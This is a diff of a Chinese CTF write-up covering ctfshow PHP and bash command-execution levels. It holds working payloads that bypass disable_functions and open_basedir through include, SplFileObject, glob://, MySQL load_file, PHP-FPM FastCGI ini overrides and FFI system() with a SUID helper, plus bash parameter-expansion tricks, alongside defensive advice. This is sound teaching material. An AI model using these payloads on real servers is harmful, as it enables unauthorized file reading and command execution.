+![image-20261120205759452](/assets/ctfshow-web-command-exec/image-20261120205759452.png)
+
+返回：
+
+```
+OB=[]
+```
+
+`[]` 里是空的 → 没有设置 `open_basedir`，文件系统层面不限制目录（对比 web75/76/77 会显示 `/var/www/html/`）。
+
+##### 2.读文件的函数在禁名单里
+
+先看名单：
+
+```
+c=ob_end_flush();$a=explode(",",ini_get("disable_functions"));
+foreach(["file_get_contents","readfile","file","fopen","highlight_file","show_source","scandir","include"] as $k){printf("%s=%d;",$k,in_array($k,$a)?1:0);}
+```
+
+![image-20261120205901471](/assets/ctfshow-web-command-exec/image-20261120205901471.png)
+
+返回：
+
+```
+file_get_contents=1;readfile=1;file=1;fopen=1;highlight_file=1;show_source=1;scandir=0;include=1;
+```
+
+`=1` 表示在名单里，`=0` 表示不在。再直接调一次做行为确认：
+
+```
+c=ob_end_flush();readfile("/flag.txt");
+```
+
+![image-20261120205946006](/assets/ctfshow-web-command-exec/image-20261120205946006.png)
+
+返回：
+
+```
+Warning: readfile() has been disabled for security reasons
+```
+
+##### 3.根目录能读
+
+```
+c=ob_end_flush();echo implode("|",scandir("/"));
+```
+
+![image-20261120210125393](/assets/ctfshow-web-command-exec/image-20261120210125393.png)
+
+`scandir` 不在名单里（`scandir=0`），所以能列目录——也就证明了 `open_basedir` 没有把文件系统关起来。
+
+##### 4.源码结构（eval + 打码）
+
+页面看不到源码（`highlight_file` 被禁），但可以用 `SplFileObject` 整段读回来。先看 warning 给的行号：
+
+```
+Warning: error_reporting() ... on line 14
+Warning: ini_set() ... on line 15
+Warning: highlight_file() ... on line 24
+```
+
+再用这条 payload 打印源码（`SplFileObject` 迭代出来的键从 **0** 开始）：
+
+```
+c=ob_end_flush();$f=new SplFileObject("index.php");foreach($f as $k=>$l){if($k>=18 and $k<=21)echo $k.": ".$l;}
+```
+
+页面输出：
+
+```
+18:         eval($c);
+19:         $s = ob_get_contents();
+20:         ob_end_clean();
+21:         echo preg_replace("/[0-9]|[a-z]/i","?",$s);
+```
+
+![image-20261120224611](/assets/ctfshow-web-command-exec/image-20261120224611.png)
+
+![image-20261120224612](/assets/ctfshow-web-command-exec/image-20261120224612.png)
+
+| 行号 | 代码 | 作用 |
+|---|---|---|
+| 19 | `eval($c);` | 执行我们 POST 的代码 |
+| 20 | `$s = ob_get_contents();` | 把这次输出抓成字符串 |
+| 21 | `ob_end_clean();` | 清空并关闭输出缓冲 |
+| 22 | `echo preg_replace("/[0-9]|[a-z]/i","?",$s);` | 字母和数字全部替换成 `?`（这就是"打码"）再输出 |
+
+页面还会多一条 Notice：
+
+```
+Notice: ob_end_clean(): failed to delete buffer. No buffer to delete in /var/www/html/index.php on line 21
+```
+
+因为 payload 第一句 `ob_end_flush()` 已经把缓冲关掉了，eval 返回后脚本执行第 21 行的 `ob_end_clean()` 时已经没有缓冲可删——**这条 Notice 恰好证明"缓冲被提前关掉"，也就是绕过打码成功的标志** 。
+
+
 #### 先找 flag 文件
 
 ```
 c=ob_end_flush();echo implode('|',scandir('/'));
 ```
 
-根目录里能看到 `flagc.txt`（注意不是 `flag.txt`，文件名每个实例可能不同，先列目录最稳）。
+根目录里能看到 `flagc.txt`
+
+![image-20261120213254558](/assets/ctfshow-web-command-exec/image-20261120213254558.png)
 
 #### 读它
 
@@ -1316,27 +1409,13 @@ c=ob_end_flush();echo implode('|',scandir('/'));
 c=ob_end_flush();include('/flagc.txt');
 ```
 
-直接出 flag。
-
-#### 对照
-
-- `c=include('/flagc.txt');` → 字母数字被替换成 `?`，看不到 flag
-- `c=ob_end_flush();include('/flagc.txt');` → 直接出 flag
-
-#### 为什么值得学
-
-这题把前面几个点组合起来，没有 pwn，全是 web 思路：
-
-- 输出过滤 → `ob_end_flush()` 关缓冲
-- 读文件函数被禁 → 用 `include`（语言构造）
-- 文件名不确定 → `scandir('/')` 先列目录
-- 没有 `open_basedir` 才读得到根目录（web72 有，所以 web72 才要上 UAF）
+![image-20261120213548639](/assets/ctfshow-web-command-exec/image-20261120213548639.png)
 
 ### web74
 
-**同一套代码，但黑名单更狠：连 `scandir`、`var_dump` 都禁了**
+**同一套代码，但黑名单把 `scandir`、`var_dump` 都禁了**
 
-源码和 web73 一字不差，还是 `eval($c)` + `preg_replace` 打码。变的是 `disable_functions`：除了原来那批读文件函数，`scandir`、`var_dump`、`print_r`、`phpinfo`、`system/exec/shell_exec/passthru` 全被加进去了。
+源码和 web73 差不多，还是 `eval($c)` + `preg_replace` 打码。变的是 `disable_functions`：除了原来那批读文件函数，`scandir`、`var_dump`、`print_r`、`phpinfo`、`system/exec/shell_exec/passthru` 这些也被加进去了。
 
 `ini_get` 没被禁，可以直接把黑名单打印出来看：
 
@@ -1403,9 +1482,9 @@ c=ob_end_flush();$o=new SplFileObject('/flagx.txt');foreach($o as $l){echo $l;}
 
 `disable_functions` 本质是一张"函数名"黑名单，有三类东西它管不住：
 
-1. **语言构造**：`echo` / `print` / `include` / `require`——写进黑名单等于没写
-2. **没被列出的函数**：`glob` / `opendir` / `printf` / `ini_get`——黑名单靠穷举，漏一个就够用
-3. **类和类方法**：`DirectoryIterator` / `SplFileObject`——禁函数管不到面向对象接口
+1. **语言构造** ：`echo` / `print` / `include` / `require`——写进黑名单等于没写
+2. **没被列出的函数** ：`glob` / `opendir` / `printf` / `ini_get`——黑名单靠穷举，漏一个就够用
+3. **类和类方法** ：`DirectoryIterator` / `SplFileObject`——禁函数管不到面向对象接口
 
 企业加固视角：只靠 `disable_functions` 必然漏，必须叠加 `open_basedir`、Web 进程最小权限、容器/沙箱隔离，并把上传目录设为不可执行。这题把"黑名单的边界在哪"演示得非常清楚，建议记住这三类绕过。
 
@@ -1424,7 +1503,7 @@ c=ob_end_flush();$o=new SplFileObject('/flagx.txt');foreach($o as $l){echo $l;}
 也就是说，PHP 脚本能碰的文件只剩站点目录。而 `/var/www/html` 里只有两个文件：
 
 - `index.php`（题目本体）
-- `flag.php` —— **假旗**，内容是 `$flag="秀秀得了,这次不在这里";`
+- `flag.php` —— **假旗** ，内容是 `$flag="秀秀得了,这次不在这里";`
 
 `getenv()` 里还有一个名为 `not_flag` 的环境变量，同样是诱饵。真 flag 在根目录：`/flag36.txt`（用 `DirectoryIterator('glob:///*')` 能看见名字）。
 
@@ -1447,9 +1526,9 @@ c=ob_end_flush();$o=new SplFileObject('/flagx.txt');foreach($o as $l){echo $l;}
 
 三个值得记住的细节：
 
-- **XXE 为什么也不行**：PHP 的 libxml 扩展把外部实体加载器接到了 PHP 的流上（`_php_libxml_external_entity_loader`），所以读文件时照样过 open_basedir 检查。连允许目录内的 `flag.php` 都报 `undefined entity`，说明实体根本没被加载。
-- **`glob('/*')` 返回 1**：那个 1 是字面量 `/` 自身，不是目录内容。带通配符的 glob 同样受 open_basedir 约束。
-- **黑名单里为什么有一堆 `strlen`/`chr`/`ord`/`bin2hex`/`dechex`**：它们不是用来防"读文件"的，而是专门用来废掉 web72 的 UAF PoC（`php7-gc-bypass` 靠这些函数做指针运算、拼 payload、算偏移）。这题里 `strlen` 一挂，UAF 脚本连 `system` 的地址都算不出来，作者是照着 PoC 逐个封的。
+- **XXE 为什么也不行** ：PHP 的 libxml 扩展把外部实体加载器接到了 PHP 的流上（`_php_libxml_external_entity_loader`），所以读文件时照样过 open_basedir 检查。连允许目录内的 `flag.php` 都报 `undefined entity`，说明实体根本没被加载。
+- **`glob('/*')` 返回 1** ：那个 1 是字面量 `/` 自身，不是目录内容。带通配符的 glob 同样受 open_basedir 约束。
+- **黑名单里为什么有一堆 `strlen`/`chr`/`ord`/`bin2hex`/`dechex`** ：它们不是用来防"读文件"的，而是专门用来废掉 web72 的 UAF PoC（`php7-gc-bypass` 靠这些函数做指针运算、拼 payload、算偏移）。这题里 `strlen` 一挂，UAF 脚本连 `system` 的地址都算不出来，作者是照着 PoC 逐个封的。
 
 #### 二、唯一活着的口子：`glob://` 能列目录
 
@@ -1526,12 +1605,12 @@ exit();
 
 #### 四、进阶选读：PHP-FPM 的 FastCGI 协议（换执行层）
 
-除了"让 MySQL 代读"，还有一条更底层的路，也实测成功：**用 FastCGI 协议让 PHP-FPM 在新的 ini 配置下重新执行脚本**。这条路的现实意义更大（SSRF 打内网 FastCGI、php-fpm 9000 裸奔都是这个原理），所以留作进阶。
+除了"让 MySQL 代读"，还有一条更底层的路，也实测成功：**用 FastCGI 协议让 PHP-FPM 在新的 ini 配置下重新执行脚本** 。这条路的现实意义更大（SSRF 打内网 FastCGI、php-fpm 9000 裸奔都是这个原理），所以留作进阶。
 
 先看两个条件：
 
 1. 环境是 php-fpm（`getenv()` 里能看到 `--enable-fpm`、`HOME=/home/www-data`），`127.0.0.1:9000` 是它的监听端口；
-2. `fsockopen` 被禁了，**但 `stream_socket_client` 没被禁**，`stream_socket_client('tcp://127.0.0.1:9000')` 实测能连上。
+2. `fsockopen` 被禁了，**但 `stream_socket_client` 没被禁** ，`stream_socket_client('tcp://127.0.0.1:9000')` 实测能连上。
 
 原理：php-fpm 用 FastCGI 协议和 Web 服务器通信，请求里的 `PHP_VALUE` / `PHP_ADMIN_VALUE` 参数会在**脚本执行之前**修改 php.ini 设置。于是我们自己构造一个 FastCGI 请求发给 FPM，让它执行 `index.php`，同时把 `open_basedir` 改成 `/`，再在 POST 的 `c` 里放 `include('/flag36.txt')`——这时候 open_basedir 已经是根目录，文件就读出来了。
 
@@ -1585,7 +1664,7 @@ echo $m[0];
 
 **1. `disable_functions` 清不掉**
 
-有的人会想在 `PHP_ADMIN_VALUE` 里写 `disable_functions=`，让 `system()` 复活。实测**不行**：`system()` 仍然报 `has been disabled`。原因是"禁用函数表"在 PHP 启动（module init）阶段就已经注册好了，请求阶段再改 ini 不会重新启用函数。所以别绕远路，直接用 `include`（语言构造，黑名单禁不掉）读文件。
+有的人会想在 `PHP_ADMIN_VALUE` 里写 `disable_functions=`，让 `system()` 复活。实测**不行** ：`system()` 仍然报 `has been disabled`。原因是"禁用函数表"在 PHP 启动（module init）阶段就已经注册好了，请求阶段再改 ini 不会重新启用函数。所以别绕远路，直接用 `include`（语言构造，黑名单禁不掉）读文件。
 
 **2. 改过的 ini 会残留在 FPM worker 里**
 
@@ -1593,18 +1672,18 @@ echo $m[0];
 
 #### 六、为什么值得学
 
-1. **"数据库代读"是经典思路**：只要目标机上有高权限服务（MySQL/Redis 等）能被低权限的 Web 进程调用，open_basedir、disable_functions 这类"进程内限制"就绕过去了。`load_file()` 是其中最常用的一招。
-2. **弱口令 + `secure_file_priv` 为空的杀伤力**：这两件事单独看都"不算漏洞"，凑在一起就是任意文件读取（配合 `INTO OUTFILE` 还能写 webshell）。
-3. **真实世界的高危配置**：php-fpm 监听 9000 且容器内/内网可达 → 可以任意覆盖 PHP 配置、执行任意脚本，等价于 RCE。SSRF 打内网 FastCGI（Gopherus 那类工具）用的是同一套协议。
-4. **看清边界的层次**：`open_basedir` + `disable_functions` 只是 PHP 解释器层的约束；往外一层有 MySQL 的权限，再往外有 FPM 的配置覆盖。哪一层没锁死，整条链就断了。
-5. **防守视角**：MySQL 用最小权限账户、限制 `FILE` 权限、设置 `secure_file_priv`、数据库只监听本地且强口令；FPM 只监听 unix socket、设置 `listen.allowed_clients`、`security.limit_extensions`、容器网络隔离。
+1. **"数据库代读"是经典思路** ：只要目标机上有高权限服务（MySQL/Redis 等）能被低权限的 Web 进程调用，open_basedir、disable_functions 这类"进程内限制"就绕过去了。`load_file()` 是其中最常用的一招。
+2. **弱口令 + `secure_file_priv` 为空的杀伤力** ：这两件事单独看都"不算漏洞"，凑在一起就是任意文件读取（配合 `INTO OUTFILE` 还能写 webshell）。
+3. **真实世界的高危配置** ：php-fpm 监听 9000 且容器内/内网可达 → 可以任意覆盖 PHP 配置、执行任意脚本，等价于 RCE。SSRF 打内网 FastCGI（Gopherus 那类工具）用的是同一套协议。
+4. **看清边界的层次** ：`open_basedir` + `disable_functions` 只是 PHP 解释器层的约束；往外一层有 MySQL 的权限，再往外有 FPM 的配置覆盖。哪一层没锁死，整条链就断了。
+5. **防守视角** ：MySQL 用最小权限账户、限制 `FILE` 权限、设置 `secure_file_priv`、数据库只监听本地且强口令；FPM 只监听 unix socket、设置 `listen.allowed_clients`、`security.limit_extensions`、容器网络隔离。
 
 #### 对照小结
 
 - PHP 层能想到的读法（include / SPL / 伪协议 / XXE / SQLite / Phar）在这题全被封死
 - `glob://` 只能列目录，不能读内容
 - web72 的 UAF 脚本也被 `strlen` 等函数封死
-- 真正破局的是**换一层**：最省事的是让 MySQL（root 权限）用 `load_file()` 代读；更底层的是用 FastCGI 协议让 FPM 重载 ini
+- 真正破局的是**换一层** ：最省事的是让 MySQL（root 权限）用 `load_file()` 代读；更底层的是用 FastCGI 协议让 FPM 重载 ini
 
 ### web76
 
@@ -1625,7 +1704,7 @@ c=ob_end_flush();$d=new PDO('mysql:host=127.0.0.1','root','root');foreach($d->qu
 
 直接出 flag。
 
-**小结**：web76 是 web75 的复用题。真正值得记住的是那个固定套路——**每关文件名都会变，先用 `DirectoryIterator('glob:///*')` 列目录确认文件名，再让 MySQL `load_file()` 代读**，不要拿上一题的路径硬套。
+**小结** ：web76 是 web75 的复用题。真正值得记住的是那个固定套路——**每关文件名都会变，先用 `DirectoryIterator('glob:///*')` 列目录确认文件名，再让 MySQL `load_file()` 代读** ，不要拿上一题的路径硬套。
 
 ### web77
 
@@ -1633,7 +1712,7 @@ c=ob_end_flush();$d=new PDO('mysql:host=127.0.0.1','root','root');foreach($d->qu
 
 **FFI：直接调用 C 函数，`disable_functions` 彻底失效**
 
-环境：`PHP 7.4.9`、`open_basedir=/var/www/html/`、**`ffi.enable=1`**、`disable_functions` 94 项。但 `FFI` 这个类既不在黑名单里，也不是黑名单能管住的东西。
+环境：`PHP 7.4.9`、`open_basedir=/var/www/html/`、**`ffi.enable=1`** 、`disable_functions` 94 项。但 `FFI` 这个类既不在黑名单里，也不是黑名单能管住的东西。
 
 #### 一、先看根目录：flag 和 readflag
 
@@ -1669,9 +1748,9 @@ c=ob_end_flush();readgzfile('out.txt');exit();
 ```
 
 - Web 进程是 `uid=33(www-data)`，而 `flag36x.txt` 是 `440 root:root`——只有 root（和 root 组）能读，**www-data 连读权限都没有**
-- `/readflag` 的权限位里有 **`s`**（`-r-sr-xr-x`）= **setuid root**：不管谁执行它，进程都以 root 身份运行
+- `/readflag` 的权限位里有 **`s`**（`-r-sr-xr-x`）= **setuid root** ：不管谁执行它，进程都以 root 身份运行
 
-所以思路是：**让 `/readflag` 以 root 身份把 flag 读出来，再把结果搬到我们能读的地方**。
+所以思路是：**让 `/readflag` 以 root 身份把 flag 读出来，再把结果搬到我们能读的地方** 。
 
 #### 三、FFI 调 system
 
@@ -1703,9 +1782,9 @@ c=ob_end_flush();readgzfile('1.txt');exit();
 
 #### 五、为什么值得学
 
-1. **FFI 是对 `disable_functions` 的"降维打击"**：黑名单拦的是 PHP 函数名，FFI 直接调 libc，`system` / `open` / `read` / `execve` 全都能用。同类绕过还有 LD_PRELOAD、PHP-FPM、UAF，但 FFI 是最省事的一个。
-2. **SUID 提权是经典组合**：Web 进程低权限 + 机器上有 SUID root 的辅助程序（`readflag`），执行它就等于借到了 root 的文件读取能力。现实中的 SUID 程序、`sudo` 配置、计划任务都是同一类"借权"思路。
-3. **防守视角**：`ffi.enable=off`（PHP 默认是 `preload`，Docker 官方镜像常被人改成 `1`）、清理不必要的 SUID 程序、`open_basedir` 只是纵深防御里的一层。
+1. **FFI 是对 `disable_functions` 的"降维打击"** ：黑名单拦的是 PHP 函数名，FFI 直接调 libc，`system` / `open` / `read` / `execve` 全都能用。同类绕过还有 LD_PRELOAD、PHP-FPM、UAF，但 FFI 是最省事的一个。
+2. **SUID 提权是经典组合** ：Web 进程低权限 + 机器上有 SUID root 的辅助程序（`readflag`），执行它就等于借到了 root 的文件读取能力。现实中的 SUID 程序、`sudo` 配置、计划任务都是同一类"借权"思路。
+3. **防守视角** ：`ffi.enable=off`（PHP 默认是 `preload`，Docker 官方镜像常被人改成 `1`）、清理不必要的 SUID 程序、`open_basedir` 只是纵深防御里的一层。
 
 ### web118
 
@@ -1742,10 +1821,10 @@ if(isset($_POST['code'])){
 
 #### 二、思路：用环境变量 + 参数展开拼出命令
 
-bash 的 `${VAR:offset:length}` 是**子串切片**，`offset` 位置是一段**算术表达式**。关键点：
+bash 的 `${VAR:offset:length}` 是**子串切片** ，`offset` 位置是一段**算术表达式** 。关键点：
 
 - `A` 是个没定义的变量 → 算术值是 `0`
-- `~` 在算术里是**按位取反**，不是通配符 → `~A` = `~0` = **-1**
+- `~` 在算术里是**按位取反** ，不是通配符 → `~A` = `~0` = **-1**
 - 负偏移表示从末尾数 → `-1` 就是**最后一个字符**
 
 ```
@@ -1760,7 +1839,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   → 末位 n
 PWD=/var/www/html                                                   → 末位 l
 ```
 
-`n` + `l` = **`nl`**。
+`n` + `l` = **`nl`** 。
 
 再补两块：
 
@@ -1791,7 +1870,7 @@ code=${PATH:~A}${PWD:~A}${IFS}?????.???
 
 #### 四、一个有意思的细节：最后一行会重复
 
-`echo ''.system($code).''` 里，`system()` 会把命令输出直接打到页面，**同时返回输出的最后一行**，再被 `echo` 打印一次。所以 `nl flag.php` 的结果是：
+`echo ''.system($code).''` 里，`system()` 会把命令输出直接打到页面，**同时返回输出的最后一行** ，再被 `echo` 打印一次。所以 `nl flag.php` 的结果是：
 
 ```
      1	<?php
@@ -1805,8 +1884,8 @@ code=${PATH:~A}${PWD:~A}${IFS}?????.???
 #### 五、为什么值得学 / 局限
 
 - 这是 **bash 参数展开**的经典用法：`${VAR:offset:length}` + 算术表达式，可以在"一个字母数字都不写"的情况下从环境变量里抠出想要的字符。同类技巧还有 `${PATH:0:1}` 取单个字符、`${#VAR}` 取长度。
-- **局限**：`${PATH:~A}${PWD:~A}` 能拼出 `nl`，是因为 PATH 恰好以 `n` 结尾、PWD 恰好以 `l` 结尾；换个目录或环境就失效。它属于 CTF 技巧，不是通用手法。
-- **防守视角**：`system()` 前挂正则本质是黑名单，永远有漏（大写字母、`$`、`{}`、`?`、`.` 全是漏的）。正确做法是**不把用户输入拼进 shell**（白名单、`escapeshellarg`、或干脆不调 shell），而不是加长黑名单。
+- **局限** ：`${PATH:~A}${PWD:~A}` 能拼出 `nl`，是因为 PATH 恰好以 `n` 结尾、PWD 恰好以 `l` 结尾；换个目录或环境就失效。它属于 CTF 技巧，不是通用手法。
+- **防守视角** ：`system()` 前挂正则本质是黑名单，永远有漏（大写字母、`$`、`{}`、`?`、`.` 全是漏的）。正确做法是**不把用户输入拼进 shell**（白名单、`escapeshellarg`、或干脆不调 shell），而不是加长黑名单。
 
 
 
@@ -1831,7 +1910,7 @@ if(isset($_POST['code'])){
 }
 ```
 
-和 web118 相比，新增封了四个：**`PATH`、`BASH`、`<`、`>`**。其余照旧：Tab、换行、小写字母、数字、`/ ( ) [ ] \ + - ! = ^ * & % ' " \` | ,` 全部禁用。
+和 web118 相比，新增封了四个：**`PATH`、`BASH`、`<`、`>`** 。其余照旧：Tab、换行、小写字母、数字、`/ ( ) [ ] \ + - ! = ^ * & % ' " \` | ,` 全部禁用。
 
 所以 web118 的 `${PATH:~A}` 直接失效——`PATH` 是禁词，一出现就 `evil input`。
 
@@ -1850,7 +1929,7 @@ if(isset($_POST['code'])){
 
 - `/` = `${PWD:${#}:${##}}` → `PWD[0:1]`
 - `a` = `${PWD:${SHLVL}:${#SHLVL}}` → `PWD[2:1]`（`/var/www/html` 第 2 位是 `a`）
-- `t` = `${PWD:~${SHLVL}:${#SHLVL}}` → 偏移 `~2` = **-3**，`PWD[-3:1]` = `t`
+- `t` = `${PWD:~${SHLVL}:${#SHLVL}}` → 偏移 `~2` = **-3** ，`PWD[-3:1]` = `t`
 
 `~` 还是 web118 那个算术取反：`~2` = -3（不是"倒数第 2 个"）。
 
@@ -1905,7 +1984,7 @@ wp 里也提到了这条路：上传一个内容为 `cat flag.php` 的文件，�
 code=.${IFS}${HOME:${#}:${##}}???${HOME:${#}:${##}}?????M???
 ```
 
-`${HOME:0:1}` = `/`，整段是 `/???/?????M???` 的 glob，靠反复发包撞 `/tmp/phpXXXXXX` 这个临时文件名。不过实测**上面的参数展开 payload 一次就出**，不用打竞态，所以优先用第一种。
+`${HOME:0:1}` = `/`，整段是 `/???/?????M???` 的 glob，靠反复发包撞 `/tmp/phpXXXXXX` 这个临时文件名。不过实测**上面的参数展开 payload 一次就出** ，不用打竞态，所以优先用第一种。
 
 #### 两个细节
 
@@ -1914,9 +1993,9 @@ code=.${IFS}${HOME:${#}:${##}}???${HOME:${#}:${##}}?????M???
 
 #### 为什么值得学
 
-- 118、119 连着两题都在演示同一件事：**环境变量本身就是一份"字符表"**。配合 `${VAR:offset:length}` 和算术表达式，可以在"没有字母数字、没有 PATH"的情况下拼出想要的命令。
+- 118、119 连着两题都在演示同一件事：**环境变量本身就是一份"字符表"** 。配合 `${VAR:offset:length}` 和算术表达式，可以在"没有字母数字、没有 PATH"的情况下拼出想要的命令。
 - 出题人只会"封词"（这题封了 `PATH`、`BASH`），但 `PWD`、`SHLVL`、`HOME`、`IFS` 这些变量永远在——黑名单式过滤封不完。
-- 防守视角还是老结论：**不要在 `system()` 里拼接用户输入**。这题所有绕过都建立在"用户输入进了 shell"这一个前提上。
+- 防守视角还是老结论：**不要在 `system()` 里拼接用户输入** 。这题所有绕过都建立在"用户输入进了 shell"这一个前提上。
 
 ### web120
 
@@ -1960,7 +2039,7 @@ web119 那条 80 多字符的 payload 到这里会被长度挡住，必须压缩
 | `${PWD:~${SHLVL}:${#SHLVL}}` | `${PWD:~${SHLVL}:${##}}` | length 用 `${##}`(=1) 代替 `${#SHLVL}`，省 5 字符 |
 | `${IFS}` | 直接写空格 | 空格没被禁，省 5 字符 |
 
-payload（**62 个字符**，刚好在 65 以内）：
+payload（**62 个字符** ，刚好在 65 以内）：
 
 ```
 code=${PWD::${##}}???${PWD::${##}}??${PWD:~${SHLVL}:${##}} ????.???
@@ -2012,6 +2091,6 @@ code=${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???
 
 #### 为什么值得学
 
-- **长度限制是另一个维度的过滤**：前面所有题都在过滤"内容"，这题第一次限制"长度"。绕法不是换更短的命令，而是**压缩语法**——省略默认参数、用更短的表达式（`${##}` 代替 `${#SHLVL}`）、能用字面量就别用变量（空格代替 `${IFS}`）。
+- **长度限制是另一个维度的过滤** ：前面所有题都在过滤"内容"，这题第一次限制"长度"。绕法不是换更短的命令，而是**压缩语法**——省略默认参数、用更短的表达式（`${##}` 代替 `${#SHLVL}`）、能用字面量就别用变量（空格代替 `${IFS}`）。
 - 三条 payload 都卡在 60~65 字符之间，说明出题人算过：正常写法全部超长，必须做语法压缩才能过。
 - 防守视角：长度限制能提高利用门槛，但同样替代不了"不把用户输入交给 shell"这条根本原则。
